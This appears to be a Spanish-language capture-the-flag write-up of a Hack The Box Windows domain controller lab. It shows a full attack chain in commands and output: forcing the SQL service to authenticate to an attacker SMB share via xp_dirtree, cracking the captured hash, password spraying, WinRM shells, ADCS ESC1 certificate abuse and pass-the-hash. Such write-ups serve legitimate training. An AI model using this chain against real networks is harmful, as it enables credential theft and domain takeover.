# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.228.253
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49708,49718
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 00:45:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-04-23T00:47:22+00:00; +8h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-04-23T00:47:22+00:00; +8h00m02s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-23T00:47:22+00:00; +8h00m02s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-23T00:42:10
| Not valid after:  2055-04-23T00:42:10
| MD5:   93a5:26a9:8eef:5bb0:8035:f95d:7780:e7a8
|_SHA-1: 0b06:1144:9953:e731:adce:a42c:f796:0727:d104:7733
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-23T00:47:22+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-04-23T00:47:22+00:00; +8h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
| smb2-time: 
|   date: 2025-04-23T00:46:44
|_  start_date: N/A

```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.228.253 2>/dev/null
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.228.253 DC.sequel.htb sequel.htb" >> /etc/hosts
```

>Si listamos los shares disponibles por SMB empleando inicio de sesión anónimo vemos las siguientes:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient -L \\\\10.129.228.253\\ -U ""          
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share
```

>Si nos conectamos a la share Public vemos un pdf interesante sobre procedimientos de SQL, por lo que vamos a descargarlo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient \\\\10.129.228.253\\Public -U ""                   
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1440402 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (94.0 KiloBytes/sec) (average 94.0 KiloBytes/sec)
```

>Abrimos el pdf con evince:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ evince SQL\ Server\ Procedures.pdf
```

>Aquí vemos unas credenciales para iniciar sesión en el MSSQL: `PublicUser:GuestUserCantWrite1`

```
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication"
```

>Vamos a probarlas para conectarnos al MSSQL empleando la herramienta de impacket mssqlclient y vemos que podemos entrar:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.228.253'              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

>Vemos que no podemos ni habilitar ni emplear xp_cmdshell para ejecutar comandos en la máquina siendo este usuario:

```bash
SQL (PublicUser  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (PublicUser  guest@master)> xp_cmdshell "whoami"
ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

>Vamos a enumerar las bases de datos:

```sql
SQL (PublicUser  guest@master)> select name from master.dbo.sysdatabases
name     
------   
master   

tempdb   

model    

msdb
```

>Ninguna de estas bases de datos posee datos interesantes para movernos lateralmente por lo que vamos a tratar de robar el hash NTLMv2 del usuario que corre el servicio MSSQL, para ello, primero vamos a crear una share de SMB:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-smbserver share -smb2support $(pwd)                              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

>Posteriormente, hacemos una llamada al share para capturar el hash del usuario al tratar de autenticarse sobre mi share:

```bash
SQL (PublicUser  guest@msdb)> EXEC master..xp_dirtree '\\10.10.14.177\share\'
subdirectory   depth   
------------   -----
```

>Si ahora vamos al servidor SMB, podemos ver que obtuvimos el hash NTLMv2 del usuario sql_svc:

```bash
[*] Incoming connection (10.129.228.253,59537)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:6ac53771c407cd6ccf958a73df98a0c0:010100000000000000a871dbabb3db01de0caa5c5e58cb1200000000010010004d00740050004f0070004c0048006900030010004d00740050004f0070004c00480069000200100064004e005a004e0058005a0045006d000400100064004e005a004e0058005a0045006d000700080000a871dbabb3db010600040002000000080030003000000000000000000000000030000050851aa016fd083d38a7d2546419681c74a48969cdaa360824e20654e6fe51700a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370037000000000000000000
[*] Closing down connection (10.129.228.253,59537)
```

>Vamos a tratar de crackear el hash empleando hashcat con la máscara 5600 que corresponde a los hashes NTLMv2, obteniendo las credenciales: `sql_svc:REGGIE1234ronnie`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ hashcat -m 5600 sql_ntlmv2 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

SQL_SVC::sequel:aaaaaaaaaaaaaaaa:6ac53771c407cd6ccf958a73df98a0c0:010100000000000000a871dbabb3db01de0caa5c5e58cb1200000000010010004d00740050004f0070004c0048006900030010004d00740050004f0070004c00480069000200100064004e005a004e0058005a0045006d000400100064004e005a004e0058005a0045006d000700080000a871dbabb3db010600040002000000080030003000000000000000000000000030000050851aa016fd083d38a7d2546419681c74a48969cdaa360824e20654e6fe51700a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370037000000000000000000:REGGIE1234ronnie
```

>Vamos a ver si son válidas en el DC, por lo que podemos ver, lo son, así que antes de nada vamos a obtener una lista de usuarios del dominio para ver si alguno posee la misma contraseña:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ crackmapexec smb 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' 2>/dev/null 
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
```

>Obtenemos una lista de usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ crackmapexec smb 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' --users 2>/dev/null
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
SMB         10.129.228.253  445    DC               [+] Enumerated domain user(s)
SMB         10.129.228.253  445    DC               sequel.htb\Nicole.Thompson                badpwdcount: 0 desc: 
SMB         10.129.228.253  445    DC               sequel.htb\James.Roberts                  badpwdcount: 0 desc: 
SMB         10.129.228.253  445    DC               sequel.htb\sql_svc                        badpwdcount: 0 desc: 
SMB         10.129.228.253  445    DC               sequel.htb\Ryan.Cooper                    badpwdcount: 0 desc: 
SMB         10.129.228.253  445    DC               sequel.htb\Brandon.Brown                  badpwdcount: 0 desc: 
SMB         10.129.228.253  445    DC               sequel.htb\Tom.Henn                       badpwdcount: 0 desc: 
SMB         10.129.228.253  445    DC               sequel.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.129.228.253  445    DC               sequel.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.129.228.253  445    DC               sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

>Tratamos el texto para quedarnos solo con los usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ cat users | awk '{print $2}' FS='\\' | awk '{print $1}' FS=" "                       
Nicole.Thompson
James.Roberts
sql_svc
Ryan.Cooper
Brandon.Brown
Tom.Henn
krbtgt
Guest
Administrator
```

>Ahora realizamos el Password Spray para ver si algún usuario posee esa contraseña, por lo que vemos, ninguno la posee:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ crackmapexec smb 10.129.228.253 -u valid_users -p 'REGGIE1234ronnie' --continue-on-success 2>/dev/null
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
SMB         10.129.228.253  445    DC               [-] sequel.htb\Ryan.Cooper:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:REGGIE1234ronnie STATUS_LOGON_FAILURE 
SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:REGGIE1234ronnie STATUS_LOGON_FAILURE
```

>Vamos a enumerar mediante el collector bloodhound-python empleando estas credenciales encontradas el dominio para poder analizarlo con Bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ bloodhound-python -u 'sql_svc' -ns 10.129.228.253 -d sequel.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Password: 
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sequel.htb
INFO: Done in 00M 17S
```

>Abrimos bloodhound y ejecutamos la base de datos neo4j, importando los archivos resultantes del comando anterior:

```bash
bloodhound &>/dev/null & disown
sudo neo4j start
```

>Aquí podemos ver que el usuario es miembro del grupo Remote Management Users que podemos abusar para obtener una shell en el DC mediante WinRM:

![image](https://github.com/user-attachments/assets/c7ed2bad-538f-4b37-a36b-34f584edc044)

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ evil-winrm -i 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
                                        
Evil-WinRM shell v3.7
                                        
<SNIP>

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

>Si enumeramos el sistema, vemos lo que pueden ser unas credenciales en un backup de unos logs de MSSQL:

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK

<SNIP>

2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]

```

>Vamos a probar las credenciales y vemos que son válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ crackmapexec smb 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3' 2>/dev/null
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3
```

>Vemos que este usuario también es miembro del grupo Remote Management Users por lo que nos conectamos mediante evil-winrm al DC, donde podemos ver la flag user.txt:

![image](https://github.com/user-attachments/assets/1d569e84-7b0a-4fc4-b9fe-574afc074098)

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ evil-winrm -i 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.7
                                        
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ls ../Desktop


    Directory: C:\Users\Ryan.Cooper\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/22/2025   5:42 PM             34 user.txt
```

# Privilege Escalation

>Como este usuario, vamos a tratar de enumerar si hay vulnerabilidades en el servicio Active Directory Certification Services (AD CS), empleando certipy:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ certipy-ad find -vulnerable -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[*] Got CA configuration for 'sequel-DC-CA'
[*] Saved BloodHound data to '20250422215504_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250422215504_Certipy.txt'
[*] Saved JSON output to '20250422215504_Certipy.json'
```

>Si abrimos el archivo resultante vemos que es vulnerable a ataques ECS1:

```JSON
"[!] Vulnerabilities": {
        "ESC1": "'SEQUEL.HTB\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
      }
```

>Además, nos brinda la siguiente información, valiosa para el ataque:

```
"CA Name": "sequel-DC-CA"
"Template Name": "UserAuthentication"
```

>Aprovecharemos esta vulnerabilidad para escalar privilegios pidiendo un certificado pfx del usuario administrador para así poder impersonarlo al obtener su hash NTLM y ganar acceso a este.

>Para ello, pediremos el certificado del usuario administrador empleando la template vulnerable:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ certipy-ad req -username 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -ca sequel-DC-CA -target DC.sequel.htb -template UserAuthentication -upn administrator@sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

>Ahora nos autenticaremos empleando el certificado pfx generado del anterior comando, para obtener el hash NTLM del usuario administrador:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ certipy-ad auth -pfx administrator.pfx -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

>Una vez teniendo este hash NTLM podemos hacer un Pass-The-Hash para obtener una shell mediante el servicio WinRM como el usuario administrador, pudiendo ver la flag root.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
└─$ evil-winrm -i 10.129.228.253 -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
                                        
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/22/2025   5:42 PM             34 root.txt
```

